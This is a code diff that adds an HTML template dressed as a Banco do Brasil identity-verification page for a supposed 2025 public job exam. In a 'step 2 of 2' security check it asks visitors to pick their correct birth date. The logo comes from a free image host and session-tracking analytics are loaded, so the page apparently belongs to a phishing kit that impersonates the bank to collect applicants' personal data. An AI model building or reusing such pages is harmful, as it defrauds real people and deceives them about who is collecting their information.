@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil - Verificação de Identidade</title>
+
+    <!-- Microsoft Clarity Analytics -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "tcndd6162u");
+    </script>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'bb-yellow': '#FEEF37',
+                        'bb-blue': '#003DA5',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <div class="bg-bb-yellow py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <div>
+                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                        CONCURSO PÚBLICO 2025
+                    </p>
+                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-bb-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">VERIFICAÇÃO DE IDENTIDADE</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8 flex-grow">
+        <div class="max-w-2xl mx-auto">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <div class="mb-6">
+                    <h2 class="text-lg font-bold text-bb-blue mb-2">Verificação de Segurança - Etapa 2 de 2</h2>
+                    <p class="text-gray-600">Para sua segurança, selecione sua data de nascimento correta:</p>
+                </div>
+
+                <form action="{{ url_for('verificar_data') }}" method="POST" class="space-y-4">
+                    {% for data in dados.datas %}
+                    <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-gray-50 transition-colors">
+                        <input type="radio" name="data" value="{{ data }}" class="h-4 w-4 text-bb-blue focus:ring-bb-blue" required>
+                        <span class="ml-3 text-gray-700">{{ data }}</span>
+                    </label>
+                    {% endfor %}
+
+                    <button type="submit" class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-6">
+                        <span>Confirmar Data de Nascimento</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    </div>
+</body>
+</html>
